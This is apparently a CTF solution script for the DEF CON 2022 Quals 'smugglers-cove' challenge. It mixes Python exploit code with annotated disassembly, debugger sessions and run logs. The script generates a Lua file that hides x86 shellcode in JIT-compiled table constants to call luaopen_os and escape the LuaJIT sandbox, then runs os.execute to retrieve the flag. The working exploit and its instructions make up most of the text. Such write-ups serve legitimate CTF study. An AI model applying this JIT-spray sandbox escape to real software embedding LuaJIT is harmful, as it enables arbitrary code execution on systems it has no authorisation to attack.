try:
  from armyknife import *
except ImportError:
  from pwn import *
  import argparse
  from struct import *

parser = argparse.ArgumentParser()
parser.add_argument("--disasm", help="adjust jump offset with disassembled result", type=str)
parser.add_argument("--with-comments", help="output with comments", action="store_true")
args = parser.parse_args()

""" Static Analysis of `libluajit-5.1.so.2`
1) Identify the version
      ```
      # strings ./libluajit-5.1.so.2  | grep 'luajit'
      libluajit-5.1.so.2
      ./?.lua;/usr/local/share/luajit-2.1.0-beta3/?.lua;/usr/local/share/lua/5.1/?.lua;/usr/local/share/lua/5.1/?/init.lua
      ```
   => `luajit-2.1.0-beta3` (Refer: <https://github.com/LuaJIT/LuaJIT/tree/v2.1.0-beta3>)
      However, this commit is too old, and not matching with this binary.
      So, we select the latest commit at Quals (Refer: <https://github.com/LuaJIT/LuaJIT/tree/1b8d8cabdcc4f1977dc8c51a82074653078d870b>)
2) `luaopen_os` is located at +0x64e50
      ```
      # x86_64-linux-gnu-objdump -tT ./libluajit-5.1.so.2 | grep luaopen_os
      0000000000064e50 g    DF .text  000000000000002c  Base        luaopen_os
      ```
"""
addrof_luaopen_os = 0x64e50
""" Static Analysis of `cove`
3) `run_code` is located at +0x181f (we used rizin disassembler <https://rizin.re/>)
      ```
      # rizin -AA ./cove
      [0x00001380]> pdf @main
                  ; DATA XREF from entry0 @ 0x13a1
      ┌ int main (int argc, char **argv, char **envp);
      ...
      │     ││    0x000019fc      mov   rax, qword [var_20h]
      │     ││    0x00001a00      add   rax, 8
      │     ││    0x00001a04      mov   rdx, qword [rax]
      │     ││    0x00001a07      mov   rax, qword [var_8h]
      │     ││    0x00001a0b      mov   rsi, rdx                             ; const char *arg2
      │     ││    0x00001a0e      mov   rdi, rax                             ; int64_t arg1
      │     ││    0x00001a11      call  fcn.0000181f
      │     ││    0x00001a16      mov   rax, qword [var_8h]
      │     ││    0x00001a1a      mov   rdi, rax
      │     ││    0x00001a1d      call  sym.imp.lua_close
      │     ││    0x00001a22      mov   eax, 0
      │     ││    ; CODE XREFS from main @ 0x19cb, 0x19ee
      │     └└──> 0x00001a27      leave
      └           0x00001a28      ret
      ```
"""
""" Dynamic Analysis of `cove`
4) Set the breakpoint at `cove`
      ```
      gef➤  b *(0x4000000000+0x181f)
      Breakpoint 1 at 0x400000181f
      ```
   NOTICE: We used qemu-x86_64-static, so, `.cove` is located at `0x4000000000`
5) Continue and identify the `lua_State` structure.
      ```
      gef➤  c
      Continuing.
      Breakpoint 1, 0x000000400000181f in ?? ()
      ──────────────────────────────────────────────────────────────────────────────── registers ────
      $rsi   : 0x000000400180539c  →  "./exploit.lua"
      $rdi   : 0x0000004001c0d380  →  0x0000000000000000
      $rip   : 0x000000400000181f  →   endbr64 
      ────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
      → 0x400000181f                  endbr64 
        0x4000001823                  push   rbp
        0x4000001824                  mov    rbp, rsp
        0x4000001827                  sub    rsp, 0x40
        0x400000182b                  mov    QWORD PTR [rbp-0x38], rdi
        0x400000182f                  mov    QWORD PTR [rbp-0x40], rsi
      gef➤  telescope $rdi
      0x0000004001c0d380│+0x0000: 0x0000000000000000   ← $rax, $rdi
      0x0000004001c0d388│+0x0008: 0x0000000000010661
      0x0000004001c0d390│+0x0010: 0x0000004001c0d3e0  →  0x00000040018a4b40  →  0x48ca8948fa1e0ff3
      0x0000004001c0d398│+0x0018: 0x0000000000000000
      0x0000004001c0d3a0│+0x0020: 0x0000004001c0ebf8  →  0xffffffffffffffff
      0x0000004001c0d3a8│+0x0028: 0x0000004001c0ebf0  →  0xfffb804001c10fe0
      0x0000004001c0d3b0│+0x0030: 0x0000004001c0ed20  →  0xffffffffffffffff
      0x0000004001c0d3b8│+0x0038: 0x0000004001c0ebe8  →  0xfffc804001c0d380
      gef➤  vmmap 0x00000040018a4b40
      [ Legend:  Code | Heap | Stack ]
      Start              End                Offset             Perm Path
      0x000000400184e000 0x00000040018b2000 0x0000000000008000 r-- /home/defcon-ctf-2022-quals-smugglers-cove/libluajit-5.1.so.2
      gef➤  vmmap libluajit-5.1.so.2
      [ Legend:  Code | Heap | Stack ]
      Start              End                Offset             Perm Path
      0x0000004001846000 0x000000400184e000 0x0000000000000000 r-- /home/defcon-ctf-2022-quals-smugglers-cove/libluajit-5.1.so.2
      0x000000400184e000 0x00000040018b2000 0x0000000000008000 r-- /home/defcon-ctf-2022-quals-smugglers-cove/libluajit-5.1.so.2
      0x00000040018b2000 0x00000040018ca000 0x000000000006c000 r-- /home/defcon-ctf-2022-quals-smugglers-cove/libluajit-5.1.so.2
      0x00000040018ca000 0x00000040018cb000 0x0000000000084000 --- /home/defcon-ctf-2022-quals-smugglers-cove/libluajit-5.1.so.2
      0x00000040018cb000 0x00000040018cd000 0x0000000000084000 r-- /home/defcon-ctf-2022-quals-smugglers-cove/libluajit-5.1.so.2
      0x00000040018cd000 0x00000040018ce000 0x0000000000086000 rw- /home/defcon-ctf-2022-quals-smugglers-cove/libluajit-5.1.so.2
      ```
   => lua_State.glref.allocf is `libluajit-5.1.so.2`+0x5eb40
      (NOTICE: `hex(0x00000040018a4b40-0x0000004001846000) == "0x5eb40"`)
"""
""" NOTICE:
- `lua_State` structure: <https://github.com/LuaJIT/LuaJIT/blob/1b8d8cabdcc4f1977dc8c51a82074653078d870b/src/lj_obj.h#L685-L700>
      ```c
      /* Per-thread state object. */
      struct lua_State {
        /* +000 */ GCHeader;
        /* +00a */ uint8_t dummy_ffid;
        /* +00b */ uint8_t status;
        /* +010 */MRef glref;           /* Link to global state. */
        ...
      };
      ```
- `global_State` structure: <https://github.com/LuaJIT/LuaJIT/blob/1b8d8cabdcc4f1977dc8c51a82074653078d870b/src/lj_obj.h#L630-L660>
      ```c
      typedef struct global_State {
        /* +000 */ lua_Alloc allocf;   /* Memory allocator. */
        /*  ... */
      } global_State;
      ```
- `lua_Alloc` is the type of function pointers: <https://github.com/LuaJIT/LuaJIT/blob/1b8d8cabdcc4f1977dc8c51a82074653078d870b/src/lua.h#L64-L67>
      ```c
      typedef void * (*lua_Alloc) (void *ud, void *ptr, size_t osize, size_t nsize);
      ```
"""
addrof_lua_state_glref_allocf = 0x5eb40

""" Identify the register condition at the entry of JIT code.
6) Run `./test.lua`
7) Set the breakpoint at `cove` and get the value of `RDI` (`lua_State L`).
      ```
      gef➤  b *(0x4000000000+0x181f)
      Breakpoint 1 at 0x400000181f
      ```
8) Continue and wait the crash after `cargo` call, then check the register condition.
      ```
      # QEMU_GDB=1234 LD_PRELOAD=./libluajit-5.1.so.2 ./cove ./test.lua 
      Hello, world!
      Hello, world!
      INSPECTION: This ship's JIT cargo was found to be 0x3fd92cff12
      ... yarr let ye apply a secret offset, cargo is now 0x3fd92cff16 ...
      ```
      ```
      gef➤  c
      Continuing.
      Breakpoint 1, 0x000000400000181f in ?? ()
      ──────────────────────────────────────────────────────────────────────────────── registers ────
      $rsi   : 0x000000400180539f  →  "./test.lua"
      $rdi   : 0x0000004001c0d380  →  0x0000000000000000
      $rip   : 0x000000400000181f  →   endbr64 
      gef➤  c
      Continuing.
      Program received signal SIGILL, Illegal instruction.
      0x0000003fd92cff16 in ?? ()
      ──────────────────────────────────────────────────────────────────────────────── registers ────
      $rax   : 0x0000003fd92cff16  →  0x4900000001fffff1
      $rbx   : 0x0000004001c114f4  →  0x0001022700000036 ("6"?)
      $rcx   : 0x0000004001c112f8  →  0x0000000000000000
      $rdx   : 0x0000004001c0ec20  →  0xfffb804001c112c8
      $rsp   : 0x0000004001804f30  →  0x0000004001c0d380  →  0x0000000000000000
      $rbp   : 0x0000004001c0d380  →  0x0000000000000000
      $rsi   : 0x0000004001802de0  →  "... yarr let ye apply a secret offset, cargo is no[...]"
      $rdi   : 0x0000004001802cc0  →  0x00000040019390d0  →  0x88bf8b48fa1e0ff3
      $rip   : 0x0000003fd92cff16  →  0x4900000001fffff1
      $r8    : 0x45              
      $r9    : 0x0000004001802c6e  →  0x0000000000450000  →  0x0000000000450000
      $r10   : 0x0000004001c0f188  →  0xfffb804001c112c8
      $r11   : 0xfffffffffffffff7
      $r12   : 0x0000004001805138  →  0x0000004001805398  →  0x2e0065766f632f2e ("./cove"?)
      $r13   : 0x0000004000001983  →   endbr64 
      $r14   : 0x0000004001c0e360  →  0x000000400184ed80  →  0xc22c8b48ca1c8b4c
      $r15   : 0x0000004001c11518  →  0x0000000002010101
      ```
   => The value of `RBP` at the entrypoint is `lua_State *L` (at `0x0000004001c0d380`)
"""
source = [
  # Save the scratched registers
  "push rbp; push rdx; push rdi; push rcx;",
  # Get the address of the `lua_State *L`
  "mov rdi, rbp",
  # Get the value of `L.glref`
  "mov rbp, [rbp+0x10]",
  # Get the value of `global_State.allocf`
  "mov rbp, [rbp]",
  # Make the constant `addrof_luaopen_os - addrof_lua_state_glref_allocf` (== +0x6310 > 0)
  "xor ecx, ecx; xor edx, edx",
  f"mov cl, {(addrof_luaopen_os - addrof_lua_state_glref_allocf)>>8:#x}",
  f"mov dl, {(addrof_luaopen_os - addrof_lua_state_glref_allocf)&0xff:#x}",
  "shl ecx, 8",
  "add ecx, edx",
  # Calculate the address of `luaopen_os`
  "add rbp, rcx",
  # Call `luaopen_os(L)`
  "call rbp",
  # Restore the scratched registers
  "pop rcx; pop rdi; pop rdx; pop rbp",
  # Jump to the normal entrypoint of the JIT code for the function `f` in order to safely return
  # Patched at the later phase
]

# Calculate the jump offsets from the disassembled source file
# At the same time, we mark the address of the entrypoint for calculating `cargo`'s offset
# If you see:
#   ```
#   INSPECTION: This ship's JIT cargo was found to be 0x4018d5fd4e
#   ```
# Then, disassemble from `0x0x4018d5fd4e` and write the result to the file.
#   ```
#   gef➤  x/200i 0x4018d5fd4e
#   ```
offsets = []
addrof_entry = None
addrs = []
cargo_offset = 90
if args.disasm:
  with open(args.disasm) as f:
    for line in f.readlines():
      """ Matched Pattern Example:
         0x403808fda6:        movabs rdi,0x437124eb51575255
      """
      addrstr, insnstr = line.split(": ", 1)
      addr = int(addrstr, 0)
      if addrof_entry is None:
        addrof_entry = addr
      if "movabs" in insnstr:
        addrs.append(addr)
  for i in range(len(addrs)-1):
    offsets.append((addrs[i+1]+2) - (addrs[i]+2+6))
  cargo_offset = (addrs[0]+2) - addrof_entry
if len(offsets) < len(source):
  offsets += [0]*(len(source)-len(offsets))

# Trick for faster jump offset convergence
orders = [1, 2, 3, 4, 5, 6, 7, 8, 9]
if len(orders) < len(source)+1:
  orders += [1]*((len(source)+1) - len(orders))

# Generate source file
print("a={}function f(a,b)")
for i in range(len(source)):
  code = asm(source[i])
  assert len(code) <= 4, source[i]
  code += b"\x90"*(4-len(code))
  """ Encoding Pattern
  a[0x1OJJebXXXXXXXX0]=1
            ^^^^^^^^ instruction payload (NOTICE: little endian)
        ^^^^ `jmp +0xJJ`
       ^ order
  """
  print(f"a[0x1{orders[i]:01x}{offsets[i]:02x}eb{code[3]:02x}{code[2]:02x}{code[1]:02x}{code[0]:02x}0]=1", end="")
  if args.with_comments:
    print(f"  -- {code.hex()}: {source[i]}")
  else:
    print()
if addrof_entry:
  code = b"\xe9"+pack("i", addrof_entry - (addrs[len(source)]+2+5))  # jmp entry
else:
  code = b"\xcc"+b"\xcc"*4  # int3; (int3;)*4
print(f"a[0x1{orders[len(source)]:01x}cc{code[4]:02x}{code[3]:02x}{code[2]:02x}{code[1]:02x}{code[0]:02x}0]=1", end="")
if args.with_comments:
  print(f"  -- {code.hex()}: {exit_source}")
else:
  print()
print("print(b)end")
print(f"f(a,\"\")f(a,\"\")cargo(f,{cargo_offset})f(a,\"\")os.execute(\"./dig_up_the_loot x marks the spot\")")

""" PWNED!!
# python3 ./gen-exploit.py > ./exploit.lua 
# QEMU_GDB=1234 LD_PRELOAD=./libluajit-5.1.so.2 ./cove ./exploit.lua 


INSPECTION: This ship's JIT cargo was found to be 0x3fe352fd4e
... yarr let ye apply a secret offset, cargo is now 0x3fe352fda8 ...
qemu-x86_64: QEMU: Terminated via GDBstub
# python3 ./gen-exploit.py --disasm ./disasm.txt > ./exploit.lua 
# QEMU_GDB=1234 LD_PRELOAD=./libluajit-5.1.so.2 ./cove ./exploit.lua 


INSPECTION: This ship's JIT cargo was found to be 0x401db8fd54
... yarr let ye apply a secret offset, cargo is now 0x401db8fdae ...
qemu-x86_64: QEMU: Terminated via GDBstub
# python3 ./gen-exploit.py --disasm ./disasm.txt > ./exploit.lua 
# QEMU_GDB=1234 LD_PRELOAD=./libluajit-5.1.so.2 ./cove ./exploit.lua 


INSPECTION: This ship's JIT cargo was found to be 0x403808fd4e
... yarr let ye apply a secret offset, cargo is now 0x403808fda8 ...
qemu-x86_64: QEMU: Terminated via GDBstub
# python3 ./gen-exploit.py --disasm ./disasm.txt > ./exploit.lua 
# QEMU_GDB=1234 LD_PRELOAD=./libluajit-5.1.so.2 ./cove ./exploit.lua 


INSPECTION: This ship's JIT cargo was found to be 0x3ffd2ffd54
... yarr let ye apply a secret offset, cargo is now 0x3ffd2ffdae ...

ERROR: ld.so: object './libluajit-5.1.so.2' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
bind: Address in use
qemu: could not open gdbserver on 1234
# LD_PRELOAD=./libluajit-5.1.so.2 ./cove ./exploit.lua 


INSPECTION: This ship's JIT cargo was found to be 0x3fd39bfd54
... yarr let ye apply a secret offset, cargo is now 0x3fd39bfdae ...

ERROR: ld.so: object './libluajit-5.1.so.2' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Shiver me timbers! Thar be your flag: FLAG PLACEHOLDER
# 
"""
